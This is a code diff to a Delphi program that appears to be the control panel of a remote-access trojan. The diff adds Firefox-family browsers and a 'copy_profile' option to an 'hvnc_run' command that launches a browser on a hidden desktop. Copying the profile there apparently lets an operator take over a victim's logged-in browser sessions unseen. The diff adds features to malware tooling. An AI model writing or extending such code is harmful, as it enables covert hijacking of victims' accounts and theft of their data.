@@ -23,6 +23,7 @@ type
     Button3   : TButton;
     ComboBox1 : TComboBox;
     ComboBox2 : TComboBox;
+    CheckBox1 : TCheckBox;
 
     procedure FormClose(Sender: TObject; var Action: TCloseAction);
     procedure Button1Click(Sender: TObject);
@@ -156,6 +157,9 @@ begin
   ComboBox2.Items.Add('explorer.exe');
   ComboBox2.Items.Add('Google Chrome');
   ComboBox2.Items.Add('Microsoft Edge');
+  ComboBox2.Items.Add('Firefox');
+  ComboBox2.Items.Add('Waterfox');
+  ComboBox2.Items.Add('LibreWolf');
   ComboBox2.ItemIndex := 0;
 
   PaintBox1.ControlStyle := PaintBox1.ControlStyle + [csDoubleClicks, csOpaque];
@@ -181,7 +185,9 @@ begin
     if Controls[I] is TButton then
       (Controls[I] as TButton).TabStop := False
     else if Controls[I] is TComboBox then
-      (Controls[I] as TComboBox).TabStop := False;
+      (Controls[I] as TComboBox).TabStop := False
+    else if Controls[I] is TCheckBox then
+      (Controls[I] as TCheckBox).TabStop := False;
   end;
 
   if Assigned(Panel1) then
@@ -190,7 +196,9 @@ begin
       if Panel1.Controls[I] is TButton then
         (Panel1.Controls[I] as TButton).TabStop := False
       else if Panel1.Controls[I] is TComboBox then
-        (Panel1.Controls[I] as TComboBox).TabStop := False;
+        (Panel1.Controls[I] as TComboBox).TabStop := False
+      else if Panel1.Controls[I] is TCheckBox then
+        (Panel1.Controls[I] as TCheckBox).TabStop := False;
     end;
 end;
 
@@ -518,6 +526,10 @@ begin
   try
     JSONObj.AddPair('action', 'hvnc_run');
     JSONObj.AddPair('path',   ComboBox2.Text);
+    if Assigned(CheckBox1) then
+      JSONObj.AddPair('copy_profile', TJSONBool.Create(CheckBox1.Checked))
+    else
+      JSONObj.AddPair('copy_profile', TJSONBool.Create(False));
     FSendJSON(FLine, JSONObj);
     LogToStatus('Executing ' + ComboBox2.Text + ' in hidden desktop...');
   finally
